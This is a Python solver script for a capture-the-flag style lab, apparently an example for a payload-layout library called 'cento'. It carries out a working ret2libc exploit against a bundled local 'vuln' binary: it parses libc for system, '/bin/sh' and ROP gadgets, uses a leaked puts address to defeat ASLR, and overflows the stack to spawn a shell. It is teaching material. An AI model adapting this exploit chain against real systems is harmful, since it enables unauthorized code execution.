#!/usr/bin/env python3
# Copyright (c) 2026 Zetier
# SPDX-License-Identifier: Apache-2.0
"""solve.py -- the cento walkthrough solver for ./vuln (stdlib only).

Everything ASLR-dependent is derived at runtime:
  * gadget/symbol OFFSETS come from parsing the host libc ELF itself
    (dynsym for puts/system, a byte search for "/bin/sh" and for the
    `pop rdi ; ret` / `ret` gadgets inside executable segments);
  * the BASE comes from the target's own leak, bound into the layout as
    the `libc_base` symbol -- the same one-bind workflow as ../after.py.

The layout is built (and its fixup list printed) BEFORE the process even
starts: the chain's structure never depends on the leak, only the one
symbol does.
"""

import os
import pathlib
import random
import select
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
# Resolve the package src (.../cento/src): ctf/ sits one level below the example
# dir, so parents[3] of this file is the subproject root at any cwd.
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[3] / "src"))

import cento  # noqa: E402  (the sys.path bootstrap must precede the import)

OFFSET = 0x88  # 128-byte buf + 8 saved rbp -- verified by `make offset-check`


# -- libc parsing (stdlib-only ELF64 reader) ---------------------------------


def parse_libc(path: str) -> dict[str, int]:
    data = open(path, "rb").read()
    assert data[:4] == b"\x7fELF" and data[4] == 2, f"{path}: not ELF64"
    (e_shoff,) = struct.unpack_from("<Q", data, 0x28)
    (e_phoff,) = struct.unpack_from("<Q", data, 0x20)
    (e_phnum,) = struct.unpack_from("<H", data, 0x38)
    e_shentsize, e_shnum = struct.unpack_from("<HH", data, 0x3A)

    def sect(i: int) -> tuple[int, int, int, int]:  # type, link, offset, size
        base = e_shoff + i * e_shentsize
        (s_type,) = struct.unpack_from("<I", data, base + 0x4)
        (s_link,) = struct.unpack_from("<I", data, base + 0x28)
        s_off, s_size = struct.unpack_from("<QQ", data, base + 0x18)
        return s_type, s_link, s_off, s_size

    syms: dict[str, int] = {}
    for i in range(e_shnum):
        s_type, s_link, s_off, s_size = sect(i)
        if s_type != 11:  # SHT_DYNSYM
            continue
        _, _, str_off, str_size = sect(s_link)
        strtab = data[str_off : str_off + str_size]
        for off in range(s_off, s_off + s_size, 24):
            (st_name,) = struct.unpack_from("<I", data, off)
            (st_value,) = struct.unpack_from("<Q", data, off + 8)
            name = strtab[st_name : strtab.index(b"\0", st_name)].decode()
            if name in ("puts", "system") and st_value and name not in syms:
                syms[name] = st_value

    # gadgets: search only inside PF_X segments, translating file->vaddr
    def find_exec(needle: bytes) -> int:
        for i in range(e_phnum):
            base = e_phoff + i * 0x38
            p_type, p_flags = struct.unpack_from("<II", data, base)
            p_off, p_vaddr = struct.unpack_from("<QQ", data, base + 0x8)
            (p_filesz,) = struct.unpack_from("<Q", data, base + 0x20)
            if p_type != 1 or not (p_flags & 1):  # PT_LOAD + PF_X
                continue
            hit = data.find(needle, p_off, p_off + p_filesz)
            if hit >= 0:
                return int(p_vaddr + (hit - p_off))  # struct gives Any under strict typing
        raise LookupError(f"gadget {needle.hex()} not in any exec segment of {path}")

    return {
        "puts": syms["puts"],
        "system": syms["system"],
        "binsh": data.find(b"/bin/sh\x00"),
        "pop_rdi": find_exec(b"\x5f\xc3"),
        "ret": find_exec(b"\xc3"),
    }


# -- the cento layout: the ../after.py shape, live offsets -------------------


class Ret2Libc(cento.View, size=0x20):
    rip: cento.u64  # saved RIP -> pop rdi ; ret
    arg: cento.u64  # what pop rdi pops
    align: cento.u64  # ret: system's movaps alignment
    call: cento.u64  # system()


def build(o: dict[str, int]) -> cento.Layout:
    layout = cento.Layout(endian="little")
    stack = layout.region("stack", max_size=0xA8, fill=0x41)  # the pad is the fill; 0xA8 = OFFSET (0x88) + the 0x20 frame
    libc = layout.sym("libc_base")  # the leak, as a symbol
    frame = stack.at(OFFSET, Ret2Libc, name="frame")
    frame.rip = libc + o["pop_rdi"]
    frame.arg = libc + o["binsh"]
    frame.align = libc + o["ret"]
    frame.call = libc + o["system"]
    return layout


# -- plumbing -----------------------------------------------------------------


def read_until(fd: int, token: bytes, timeout: float = 5.0) -> bytes:
    buf, deadline = b"", time.monotonic() + timeout
    while token not in buf:
        remain = deadline - time.monotonic()
        if remain <= 0:
            raise TimeoutError(f"waiting for {token!r}; got so far: {buf!r}")
        r, _, _ = select.select([fd], [], [], remain)
        if not r:
            continue
        chunk = os.read(fd, 4096)
        if not chunk:
            raise EOFError(f"target closed while waiting for {token!r}; got: {buf!r}")
        buf += chunk
    return buf


def libc_path_of(pid: int, timeout: float = 2.0) -> str:
    deadline = time.monotonic() + timeout  # poll: exec + loader need a moment
    while True:
        for line in open(f"/proc/{pid}/maps"):
            path = line.split(None, 5)[-1].strip() if line.count("/") else ""
            if path.endswith("libc.so.6"):
                return path
        if time.monotonic() > deadline:
            raise LookupError(f"no libc.so.6 mapping in /proc/{pid}/maps")
        time.sleep(0.02)


def pwn() -> None:
    vuln = os.path.join(HERE, "vuln")
    proc = subprocess.Popen([vuln], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
    assert proc.stdin is not None and proc.stdout is not None  # both are PIPE above
    try:
        offs = parse_libc(libc_path_of(proc.pid))
        print(
            f"[*] derived offsets: puts={offs['puts']:#x} system={offs['system']:#x} binsh={offs['binsh']:#x} pop_rdi={offs['pop_rdi']:#x} ret={offs['ret']:#x}"
        )

        layout = build(offs)
        print("[*] pre-leak fixups (the chain waits on exactly one symbol):")
        for f in layout.emit(cento.Backend.IMAGE, final=False).fixups:
            print(f"      {f}")

        leak_line = read_until(proc.stdout.fileno(), b"\n")
        leaked_puts = int(leak_line.split(b"@")[1], 16)
        base = leaked_puts - offs["puts"]
        print(f"[*] leak: puts @ {leaked_puts:#x} -> libc_base = {base:#x}")
        assert base % 0x1000 == 0, "derived base is not page-aligned; wrong puts offset?"

        layout.bind("libc_base", base, source="puts leak, this run")
        chain = layout.emit(cento.Backend.IMAGE).artifact["stack"]

        # Send exactly 0x200 bytes so vuln's single read(0, buf, 0x200)
        # consumes the whole write and none of it leaks into the shell.
        proc.stdin.write(chain + b"\x00" * (0x200 - len(chain)))
        proc.stdin.flush()
        time.sleep(0.2)  # let read() return and the chain reach system("/bin/sh")

        marker = f"CENTO_PWNED_{random.randrange(16**8):08x}"
        proc.stdin.write(f"echo {marker}; exit\n".encode())
        proc.stdin.flush()
        out = read_until(proc.stdout.fileno(), marker.encode())
        print(f"[+] shell answered: {marker} (raw tail: {out[-64:]!r})")
    except (TimeoutError, EOFError) as e:
        proc.kill()
        rc = proc.wait()
        print(f"[-] FAILED: {e}\n    vuln exit status: {rc} (negative = killed by signal; -11 means the chain crashed)")
        raise SystemExit(1) from e
    finally:
        try:
            proc.kill()
        except OSError:
            pass
        proc.wait()


if __name__ == "__main__":
    pwn()
